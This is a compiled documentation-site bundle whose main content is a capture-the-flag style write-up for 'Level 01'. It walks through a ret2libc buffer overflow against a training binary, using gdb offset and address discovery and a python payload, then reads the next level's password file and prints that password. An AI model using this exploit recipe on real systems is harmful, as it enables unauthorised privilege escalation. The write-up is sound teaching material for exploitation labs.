"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[120],{1618:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>x,contentTitle:()=>h,default:()=>f,frontMatter:()=>u,metadata:()=>t,toc:()=>p});const t=JSON.parse('{"id":"level01","title":"\ud83d\udd10 Level 01","description":"<MissionObjective","source":"@site/docs/level01.md","sourceDirName":".","slug":"/level01","permalink":"/docs/level01","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level01.md","tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"\ud83e\udde9 Level 00","permalink":"/docs/level00"},"next":{"title":"\ud83d\udca3 Level 02","permalink":"/docs/level02"}}');var i=n(4848),a=n(8453),r=n(3905),l=n(7916),d=n(8620),o=n(4700),c=n(6076);const u={sidebar_position:3},h="\ud83d\udd10 Level 01",x={},p=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Binary Analysis",id:"binary-analysis",level:2},{value:"Vulnerability Discovery",id:"vulnerability-discovery",level:2},{value:"Finding the Offset",id:"finding-the-offset",level:2},{value:"Address Discovery",id:"address-discovery",level:2},{value:"Live Demonstration",id:"live-demonstration",level:2},{value:"Step-by-Step Exploitation",id:"step-by-step-exploitation",level:2},{value:"Payload Breakdown",id:"payload-breakdown",level:2},{value:"Key Takeaways",id:"key-takeaways",level:2}];function m(e){const s={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"-level-01",children:"\ud83d\udd10 Level 01"})}),"\n",(0,i.jsx)(l.A,{level:"Level 01",target:"level02 privileges",method:"Buffer overflow exploitation"}),"\n",(0,i.jsx)(s.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,i.jsx)(d.A,{type:"Stack-based Buffer Overflow",severity:"high",description:"The binary contains a buffer overflow vulnerability where fgets() reads 100 bytes into a 16-byte buffer. This allows overwriting the saved return address on the stack to redirect execution flow.",techniques:["Buffer Overflow","Return Address Overwrite","ROP Chain Construction"]}),"\n",(0,i.jsx)(s.h2,{id:"binary-analysis",children:"Binary Analysis"}),"\n",(0,i.jsx)(o.A,{title:"GDB Disassembly",command:"gdb -q ./level01",output:"(gdb) disas main\nDump of assembler code for function main:\n 0x08048464 <+0>:     push   %ebp\n 0x08048465 <+1>:     mov    %esp,%ebp\n ...\n [Two fgets() calls visible]\n [Logic flow with verify_user_name and verify_user_pass]\n ..."}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.strong,{children:"Key Observations:"})}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["Program has two ",(0,i.jsx)(s.code,{children:"fgets()"})," calls for username and password input"]}),"\n",(0,i.jsxs)(s.li,{children:["Second ",(0,i.jsx)(s.code,{children:"fgets()"})," reads 100 bytes into a 16-byte buffer"]}),"\n",(0,i.jsx)(s.li,{children:"Classic stack-based buffer overflow vulnerability"}),"\n"]}),"\n",(0,i.jsx)(s.h2,{id:"vulnerability-discovery",children:"Vulnerability Discovery"}),"\n",(0,i.jsx)(o.A,{title:"Vulnerable Code Analysis",command:"# In main function:",output:"char buffer[16];           // 16-byte buffer on stack\nfgets(buffer, 100, stdin);  // Reads up to 100 bytes - OVERFLOW!"}),"\n",(0,i.jsx)(s.h2,{id:"finding-the-offset",children:"Finding the Offset"}),"\n",(0,i.jsx)(o.A,{title:"EIP Offset Discovery",command:'python -c "print("dat_wil\\n" + "A"*100)" > /tmp/input.txt',output:"Creating test payload to find EIP overwrite offset"}),"\n",(0,i.jsx)(o.A,{title:"Testing with GDB",command:"gdb ./level01",output:"(gdb) run < /tmp/input.txt\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) info registers\neax: 0x0  ebx: 0x0  ecx: 0x0  edx: 0x0\nesp: 0xbffff700  ebp: 0x41414141  esi: 0x0  edi: 0x0\neip: 0x41414141  <-- EIP overwritten with 'AAAA'"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Critical Discovery:"})," EIP is overwritten at offset 80 bytes!"]}),"\n",(0,i.jsx)(s.h2,{id:"address-discovery",children:"Address Discovery"}),"\n",(0,i.jsx)(o.A,{title:"Finding system() address",command:"(gdb) find 0xf7e2c000, 0xf7fcc000, system",output:'0xf7e6aed0\n(gdb) x/s 0xf7e6aed0\n0xf7e6aed0: "system"'}),"\n",(0,i.jsx)(o.A,{title:"Finding exit() address",command:"(gdb) info functions exit",output:"0xf7e5eb70  exit\n(gdb) x/s 0xf7e5eb70"}),"\n",(0,i.jsx)(o.A,{title:"Finding /bin/sh string",command:"(gdb) find 0xf7e2c000, 0xf7fcc000, /bin/sh",output:'0xf7f897ec\n(gdb) x/s 0xf7f897ec\n0xf7f897ec: "/bin/sh"'}),"\n",(0,i.jsx)(s.h2,{id:"live-demonstration",children:"Live Demonstration"}),"\n",(0,i.jsx)(r.A,{src:"https://asciinema.org/a/o2F6KCbfJ4YF5a1k7eONrIQLA.js",id:"asciicast-o2F6KCbfJ4YF5a1k7eONrIQLA"}),"\n",(0,i.jsx)(s.h2,{id:"step-by-step-exploitation",children:"Step-by-Step Exploitation"}),"\n",(0,i.jsx)(c.A,{steps:[{title:"Create the payload",description:"Construct buffer overflow payload with system() call",command:'python -c "print("dat_wil\n" + "A"*80 + "\\\\xd0\\\\xae\\\\xe6\\\\xf7\\" + \\"\\\\x70\\\\xeb\\\\xe5\\\\xf7\\" + \\"\\\\xec\\\\x97\\\\xf8\\\\xf7\\")" > /tmp/payload',output:"Payload structure:\\n- dat_wil\\\\n: valid username\\n- A*80: padding to reach return address\\n- system() address: 0xf7e6aed0\\n- exit() address: 0xf7e5eb70\\n- /bin/sh string: 0xf7f897ec"},{title:"Execute the exploit",description:"Launch the binary with our payload to trigger buffer overflow",command:"(cat /tmp/payload; cat) | ./level01",output:"$ # Shell obtained with level02 privileges"},{title:"Verify privilege escalation",description:"Confirm we have successfully escalated to level02",command:"whoami",output:"level02"},{title:"Access the password",description:"Retrieve the password for the next level",command:"cat /home/users/level02/.pass",output:"PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv"}]}),"\n",(0,i.jsx)(s.h2,{id:"payload-breakdown",children:"Payload Breakdown"}),"\n",(0,i.jsx)(o.A,{title:"Exploit Structure",command:"# Payload components:",output:'Username: "dat_wil\\\\n"        # Valid username (required)\nPadding:  "A" * 80            # Fill buffer up to return address\nRET:      0xf7e6aed0          # system() function address  \nARG1:     0xf7e5eb70          # exit() as return address\nARG2:     0xf7f897ec          # "/bin/sh" string address\n\nStack layout after overflow:\n[buffer][padding][system][exit]["/bin/sh"]\n                 ^RET   ^ARG1  ^ARG2'}),"\n",(0,i.jsx)(s.h2,{id:"key-takeaways",children:"Key Takeaways"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Buffer bounds checking"})," is critical - never read more data than buffer can hold"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Stack layout understanding"})," is essential for precise return address overwriting"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Dynamic address resolution"})," using GDB is necessary due to ASLR/library loading"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"ROP chain construction"})," allows calling functions with arguments via stack manipulation"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Username validation bypass"}),' - program accepts specific usernames like "dat_wil"']}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Tools used:"})," ",(0,i.jsx)(s.code,{children:"gdb"}),", ",(0,i.jsx)(s.code,{children:"python"}),", buffer overflow techniques, address discovery, ROP chains"]}),"\n",(0,i.jsx)(s.admonition,{title:"Important Notes",type:"warning",children:(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Addresses may change between runs due to ASLR - always verify addresses before exploitation"}),"\n",(0,i.jsx)(s.li,{children:"The offset (80 bytes) is specific to this binary's stack layout"}),"\n",(0,i.jsx)(s.li,{children:"Valid username is required to reach the vulnerable password input function"}),"\n"]})}),"\n",(0,i.jsx)(s.admonition,{title:"Exploitation Method",type:"tip",children:(0,i.jsxs)(s.p,{children:["This classic buffer overflow overwrites the return address to redirect execution to ",(0,i.jsx)(s.code,{children:'system("/bin/sh")'}),", effectively gaining a shell with the target user's privileges."]})})]})}function f(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(m,{...e})}):m(e)}},3905:(e,s,n)=>{n.d(s,{A:()=>a});var t=n(6540),i=n(4848);const a=({src:e,id:s})=>{const n=(0,t.useRef)(null);return(0,t.useEffect)(()=>{const t=document.createElement("script");return t.src=e,t.id=s,t.async=!0,n.current&&n.current.appendChild(t),()=>{const e=document.getElementById(s);e&&e.remove()}},[e,s]),(0,i.jsx)("div",{ref:n})}},4700:(e,s,n)=>{n.d(s,{A:()=>p});var t=n(6540);const i="codeContainer_ZrQf",a="codeHeader_PMJ9",r="codeTitle_tp4q",l="copyButton_vymH",d="codeContent_hjih",o="commandSection_kIAe",c="prompt_g6zt",u="command_jQGV",h="output_eCt5";var x=n(4848);const p=({command:e,output:s,language:n="bash",title:p})=>{const[m,f]=(0,t.useState)(!1);return(0,x.jsxs)("div",{className:i,children:[p&&(0,x.jsxs)("div",{className:a,children:[(0,x.jsx)("span",{className:r,children:p}),(0,x.jsx)("button",{className:l,onClick:()=>{const n=e||s||"";navigator.clipboard.writeText(n),f(!0),setTimeout(()=>f(!1),2e3)},children:m?"\u2713":"Copy"})]}),(0,x.jsxs)("div",{className:d,children:[e&&(0,x.jsxs)("div",{className:o,children:[(0,x.jsx)("span",{className:c,children:"$"}),(0,x.jsx)("span",{className:u,children:e})]}),s&&(0,x.jsx)("pre",{className:h,children:s})]})]})}},6076:(e,s,n)=>{n.d(s,{A:()=>m});n(6540);const t="stepsContainer_pG2T",i="step_fonX",a="stepHeader_lANh",r="stepNumber_JMan",l="stepTitle_pSoA",d="stepDescription_I1sy",o="codeBlock_MNNe",c="commandLine_KPva",u="prompt_hyWW",h="command_dhjP",x="output_FTQu";var p=n(4848);const m=({steps:e})=>(0,p.jsx)("div",{className:t,children:e.map((e,s)=>(0,p.jsxs)("div",{className:i,children:[(0,p.jsxs)("div",{className:a,children:[(0,p.jsx)("span",{className:r,children:s+1}),(0,p.jsx)("h3",{className:l,children:e.title})]}),(0,p.jsx)("p",{className:d,children:e.description}),e.command&&(0,p.jsxs)("div",{className:o,children:[(0,p.jsxs)("div",{className:c,children:[(0,p.jsx)("span",{className:u,children:"$"}),(0,p.jsx)("code",{className:h,children:e.command})]}),e.output&&(0,p.jsx)("pre",{className:x,children:e.output})]})]},s))})},7916:(e,s,n)=>{n.d(s,{A:()=>u});n(6540);const t="missionCard_aJIf",i="missionHeader_ujCY",a="levelBadge_E6Y7",r="missionTitle_MLqA",l="missionContent_AuQf",d="missionText_YjWt",o="targetCode_IWAs";var c=n(4848);const u=({target:e,method:s,level:n})=>(0,c.jsxs)("div",{className:t,children:[(0,c.jsxs)("div",{className:i,children:[(0,c.jsx)("span",{className:a,children:n}),(0,c.jsx)("h2",{className:r,children:"Mission Objective"})]}),(0,c.jsx)("div",{className:l,children:(0,c.jsxs)("p",{className:d,children:["Gain access to user ",(0,c.jsx)("code",{className:o,children:e})," by exploiting ",s,"."]})})]})},8453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>l});var t=n(6540);const i={},a=t.createContext(i);function r(e){const s=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function l(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:s},e.children)}},8620:(e,s,n)=>{n.d(s,{A:()=>x});n(6540);const t="card_anxl",i="header_h_Kv",a="title_xshN",r="severityBadge_p8m1",l="description_LGUH",d="techniques_SXJm",o="techniquesTitle_X_0j",c="techniquesList_aLL1",u="techniqueTag_HgBs";var h=n(4848);const x=({type:e,severity:s,description:n,techniques:x})=>{const p=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,h.jsxs)("div",{className:t,children:[(0,h.jsxs)("div",{className:i,children:[(0,h.jsx)("h3",{className:a,children:e}),(0,h.jsx)("span",{className:r,style:{backgroundColor:`${p(s)}20`,color:p(s),borderColor:`${p(s)}40`},children:s.toUpperCase()})]}),(0,h.jsx)("p",{className:l,children:n}),(0,h.jsxs)("div",{className:d,children:[(0,h.jsx)("h4",{className:o,children:"Techniques"}),(0,h.jsx)("div",{className:c,children:x.map((e,s)=>(0,h.jsx)("span",{className:u,children:e},s))})]})]})}}}]);